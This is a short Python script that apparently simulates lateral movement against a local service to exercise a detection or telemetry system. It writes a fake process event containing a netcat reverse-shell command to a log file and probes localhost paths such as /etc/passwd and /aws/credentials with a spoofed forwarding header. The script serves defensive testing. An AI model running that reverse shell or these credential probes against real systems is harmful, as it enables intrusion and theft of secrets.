import json
import time
import os
import requests

def simulate_lateral_movement(target_url: str):
    """Simulates a lateral movement attempt by trying to access other internal services."""
    print(f"[*] Starting lateral movement simulation from compromised host...")
    
    # Simulate a compromised web server trying to hit the DB directly or other internal endpoints
    attacker_ip = "10.0.0.10" # Internal Web Server IP
    
    # Also inject a suspicious process event to the telemetry
    log_file = "backend/telemetry.log"
    event = {
        "event_type": "suspicious_process",
        "ip": attacker_ip,
        "process_name": "nc -e /bin/bash 192.168.1.5 4444",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    }
    
    try:
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        with open(log_file, "a") as f:
            f.write(json.dumps(event) + "\n")
        print(f"[*] Injected suspicious process execution event into telemetry")
    except Exception as e:
        print(f"[-] Failed to inject event: {e}")

    # Now make some strange API calls
    headers = {"X-Forwarded-For": attacker_ip}
    weird_endpoints = ["/admin", "/config", "/etc/passwd", "/aws/credentials"]
    
    for endpoint in weird_endpoints:
        try:
            print(f"[*] Attempting unauthorized lateral access to {endpoint}")
            requests.get(f"{target_url}{endpoint}", headers=headers)
        except:
            pass
        time.sleep(0.5)

if __name__ == "__main__":
    simulate_lateral_movement("http://localhost:8006")
